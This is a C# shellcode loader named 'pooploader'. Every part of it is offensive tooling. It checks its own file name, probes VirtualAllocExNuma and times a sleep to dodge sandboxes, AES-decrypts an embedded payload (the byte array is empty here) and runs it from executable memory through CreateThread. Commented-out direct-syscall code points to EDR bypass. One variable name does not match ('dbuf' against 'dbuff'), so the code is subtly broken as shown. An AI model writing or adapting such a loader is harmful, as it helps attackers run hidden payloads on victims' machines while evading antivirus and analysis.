using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
//using Data = SharpWhispers.Data;
//using Syscall = Syscalls.Syscalls;


namespace pooploader
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void evade()
        {
            string fileName = AppDomain.CurrentDomain.FriendlyName;
            Regex filter = new Regex("(.*)(pooploader)(.*)");
            if (!filter.IsMatch(fileName))
            {
                Environment.Exit(0);
            }
            else
            {
                int x = 1;
                while (x < 100)
                {
                    x += 5;
                }
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
        }


        static void Main(string[] args)
        {
            evade();

            byte[] Key = Convert.FromBase64String("AAbCAwQFBg1IAQoLDA00Dw==");
            byte[] IV = Convert.FromBase64String("AAEbAwQFBg1ICAoLDA00Dw==");
            byte[] buf = new byte[688] {  };

            byte[] aesDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
            {
                using (var aes = Aes.Create())
                {
                    aes.KeySize = 128;
                    aes.BlockSize = 128;
                    aes.Padding = PaddingMode.PKCS7;
                    aes.Mode = CipherMode.CBC;
                    aes.Key = key;
                    aes.IV = iv;
                    using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                    {
                        return GetDecrypt(CEncryptedShell, decryptor);
                    }
                }
            }

            byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
            {
                using (var ms = new MemoryStream())
                using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
                {
                    cryptoStream.Write(data, 0, data.Length);
                    cryptoStream.FlushFinalBlock();
                    return ms.ToArray();
                }
            }

            byte[] dbuff = aesDecrypt(buf, Key, IV);
            int len = dbuff.Length;
            IntPtr address = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(dbuf, 0, address, len);
            //IntPtr hThread = IntPtr.Zero;
            //IntPtr poop = (uint)Syscall.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL, (IntPtr)0, IntPtr.Zero, address, IntPtr.Zero, false, 0, 0 , 0,IntPtr.Zero);
            IntPtr poop = CreateThread(IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(poop, 0xFFFFFFFF);
        }
    }
}